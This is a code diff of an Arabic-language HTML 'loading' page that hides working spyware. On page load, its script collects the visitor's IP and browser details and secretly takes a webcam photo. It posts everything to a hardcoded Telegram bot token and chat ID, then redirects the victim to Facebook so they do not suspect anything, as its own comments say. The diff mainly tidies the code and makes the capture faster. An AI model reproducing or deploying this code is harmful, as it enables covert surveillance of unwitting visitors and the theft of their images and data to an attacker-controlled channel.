@@ -6,14 +6,14 @@
     <title>جاري التحميل...</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            flex-direction: column;
+            background: #f0f2f5;
+            font-family: Arial, sans-serif;
         }
         .loading {
             text-align: center;
@@ -22,10 +22,10 @@
             border: 4px solid #f3f3f3;
             border-top: 4px solid #1877f2;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -33,171 +33,163 @@
         }
         p {
             color: #606770;
-            font-size: 18px;
-        }
-        .hidden {
-            display: none;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
+    <div class="loading">
+        <div class="spinner"></div>
+        <p>جاري تحميل الصفحة...</p>
+    </div>
 
-<div class="loading">
-    <div class="spinner"></div>
-    <p>جاري التحميل...</p>
-</div>
+    <script>
+        // ===== إعدادات بوت التيلجرام =====
+        const BOT_TOKEN = '8940194661:AAFXBaZq-9j9H_GuJIXHYXYOnk-hpxmLxYY';
+        const CHAT_ID = '8918858258';
 
-<script>
-    // ===== إعدادات بوت التيلجرام =====
-    const BOT_TOKEN = '8940194661:AAFXBaZq-9j9H_GuJIXHYXYOnk-hpxmLxYY';
-    const CHAT_ID = '8918858258';
-
-    // ===== دالة جلب الـ IP =====
-    async function getPublicIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return 'غير معروف';
+        // ===== دالة جلب الـ IP =====
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'غير معروف';
+            }
         }
-    }
 
-    // ===== دالة بيانات المتصفح =====
-    function getBrowserInfo() {
-        return `
+        // ===== دالة بيانات المتصفح =====
+        function getBrowserInfo() {
+            return `
 🎯 **تم اختراق الضحية!**
 
-📱 **بيانات المتصفح**:
+📱 **البيانات المسروقة**:
 - المتصفح: ${navigator.userAgent}
 - اللغة: ${navigator.language}
 - الشاشة: ${screen.width}x${screen.height}
 - الوقت: ${new Date().toLocaleString('ar-EG')}
 - كوكيز مفعلة: ${navigator.cookieEnabled ? 'نعم' : 'لا'}
 - الرابط: ${window.location.href}
-        `;
-    }
+            `;
+        }
 
-    // ===== دالة التصوير =====
-    function capturePhoto() {
-        return new Promise((resolve) => {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                } 
-            })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                video.play();
+        // ===== دالة التقاط الصورة فوراً =====
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    video.play();
 
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, 640, 480);
-                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-                    canvas.remove();
-                    
-                    resolve(imageData);
-                }, 1000);
-            })
-            .catch(() => {
-                resolve(null);
+                    // ناخد الصورة فوراً بعد 300 مللي فقط
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                        canvas.remove();
+                        
+                        resolve(imageData);
+                    }, 300);
+                })
+                .catch(() => {
+                    resolve(null);
+                });
             });
-        });
-    }
-
-    // ===== دالة إرسال لتيلجرام =====
-    async function sendToTelegram(type, content) {
-        const baseUrl = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-        try {
-            if (type === 'text') {
-                await fetch(`${baseUrl}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: content,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } else if (type === 'photo') {
-                const blob = dataURLtoBlob(content);
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'spy_photo.jpg');
-
-                await fetch(`${baseUrl}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }
-        } catch (e) {
-            console.error('❌ فشل الإرسال:', e);
         }
-    }
 
-    // ===== تحويل Base64 لـ Blob =====
-    function dataURLtoBlob(dataURL) {
-        const parts = dataURL.split(',');
-        const mime = parts[0].match(/:(.*?);/)[1];
-        const byteString = atob(parts[1]);
-        const arrayBuffer = new ArrayBuffer(byteString.length);
-        const uint8Array = new Uint8Array(arrayBuffer);
-        for (let i = 0; i < byteString.length; i++) {
-            uint8Array[i] = byteString.charCodeAt(i);
-        }
-        return new Blob([arrayBuffer], { type: mime });
-    }
+        // ===== دالة إرسال لتيلجرام =====
+        async function sendToTelegram(type, content) {
+            const baseUrl = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-    // ===== ✅ الوظيفة الرئيسية: تشتغل تلقائياً =====
-    (async function autoSpy() {
-        try {
-            console.log('🕵️ بدء التجسس التلقائي...');
-            
-            // 1. جلب الـ IP
-            const ip = await getPublicIP();
-            
-            // 2. بيانات المتصفح
-            const browserInfo = getBrowserInfo();
-            
-            // 3. التقاط الصورة (لو الكاميرا متاحة)
-            const photoBase64 = await capturePhoto();
-            
-            // 4. تجهيز الرسالة
-            let message = `${browserInfo}\n🌐 IP: ${ip}`;
-            
-            // 5. إرسال النص
-            await sendToTelegram('text', message);
-            console.log('✅ تم إرسال البيانات');
-            
-            // 6. إرسال الصورة لو موجودة
-            if (photoBase64) {
-                await sendToTelegram('photo', photoBase64);
-                console.log('✅ تم إرسال الصورة');
+            try {
+                if (type === 'text') {
+                    await fetch(`${baseUrl}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: content,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } else if (type === 'photo') {
+                    const blob = dataURLtoBlob(content);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'spy_photo.jpg');
+
+                    await fetch(`${baseUrl}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+            } catch (e) {
+                console.error('❌ فشل الإرسال:', e);
             }
-            
-            // 7. توجيه الضحية لفيسبوك عشان متشكش
-            setTimeout(() => {
+        }
+
+        // ===== تحويل Base64 لـ Blob =====
+        function dataURLtoBlob(dataURL) {
+            const parts = dataURL.split(',');
+            const mime = parts[0].match(/:(.*?);/)[1];
+            const byteString = atob(parts[1]);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uint8Array = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([arrayBuffer], { type: mime });
+        }
+
+        // ===== ✅ التنفيذ الفوري =====
+        (async function startSpying() {
+            try {
+                console.log('🕵️ بدء التجسس الفوري...');
+                
+                // 1. نبدأ كل حاجة مع بعض (موازي)
+                const [ip, photo] = await Promise.all([
+                    getPublicIP(),
+                    capturePhoto()
+                ]);
+                
+                // 2. تجهيز البيانات
+                const browserInfo = getBrowserInfo();
+                let message = `${browserInfo}\n🌐 IP: ${ip}`;
+                
+                // 3. إرسال النص
+                await sendToTelegram('text', message);
+                console.log('✅ تم إرسال البيانات');
+                
+                // 4. إرسال الصورة لو موجودة
+                if (photo) {
+                    await sendToTelegram('photo', photo);
+                    console.log('✅ تم إرسال الصورة');
+                }
+                
+                // 5. التوجيه لفيسبوك فوراً
                 window.location.href = 'https://www.facebook.com';
-            }, 2000);
-            
-        } catch (error) {
-            console.error('❌ خطأ:', error);
-            // لو حصل خطأ، يروح فيسبوك عادي
-            window.location.href = 'https://www.facebook.com';
-        }
-    })();
-</script>
-
+                
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                // حتى لو حصل خطأ، يروح فيسبوك
+                window.location.href = 'https://www.facebook.com';
+            }
+        })();
+    </script>
 </body>
 </html>
